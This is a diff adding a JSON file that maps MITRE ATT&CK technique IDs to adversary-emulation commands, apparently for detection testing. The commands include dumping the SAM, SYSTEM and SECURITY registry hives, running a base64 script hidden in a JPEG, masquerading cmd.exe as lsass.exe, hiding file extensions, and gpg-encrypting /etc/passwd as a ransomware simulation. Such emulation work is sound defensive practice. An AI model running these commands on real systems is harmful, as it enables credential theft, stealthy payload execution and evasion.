@@ -1,0 +1,12 @@
+{
+  "T1001.002": "cat \"PathToAtomicsFolder/script.sh\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"PathToAtomicsFolder/image.jpg\" - > \"PathToAtomicsFolder/evil_image.jpg\"; strings \"PathToAtomicsFolder/evil_image.jpg\" | tail -n 1 | base64 -d | sh",
+  "T1003.002": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security",
+  "T1016": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config",
+  "T1021.006": "Enable-PSRemoting -Force",
+  "T1027.001": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes\ndd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data",
+  "T1030": "cd /tmp/T1030; split -b 5000000 T1030_urandom\nls -l /tmp/T1030",
+  "T1036.003": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B",
+  "T1105": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files",
+  "T1112": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f",
+  "T1486": "echo \"passwd\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd"
+}
